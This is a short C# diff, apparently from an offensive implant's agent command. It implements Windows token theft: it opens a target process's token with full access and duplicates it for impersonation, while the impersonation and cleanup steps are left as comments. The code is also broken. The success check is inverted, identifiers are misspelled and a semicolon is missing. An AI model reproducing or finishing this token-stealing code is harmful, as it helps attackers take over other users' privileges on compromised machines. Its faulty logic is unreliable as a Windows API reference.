@@ -23,9 +23,19 @@ namespace Agent.Commands
 
             var hprocess = Process.GetProcessById(pid).Handle;
             //open handel to token 
-            Native.Advapi.OpenProcessToken(hprocess,Native.Advapi.DesiredAccess.TOKEN_ALL_ACCESS, out var hToken ))
-            
+            if (Native.Advapi.OpenProcessToken(hprocess, Native.Advapi.DesiredAccess.TOKEN_ALL_ACCESS, out var hToken))
+                return "Failed open [rocess token";
+
             //duplicate token 
+
+            var sa = new Native.Advapi.SECURITY_ATTRIBUTEs();
+           if(!Native.Advapi.DuplicateTokenEx(hToken,Native.Advapi.TokenAccess.TOKEN_ALL_ACCESS ,ref sa, Native.Advapi.SecurityImpersonationLevel.SECURITY_IMPERSNATION,
+                Native.Advapi.TokenType.TOKEN_IMPERSONATION,out var hTokenDup)){
+
+                Native.Kernel32.CloseHandle(hToken)
+
+            }
+
             //impersonate toke 
             //close token handles 
         }
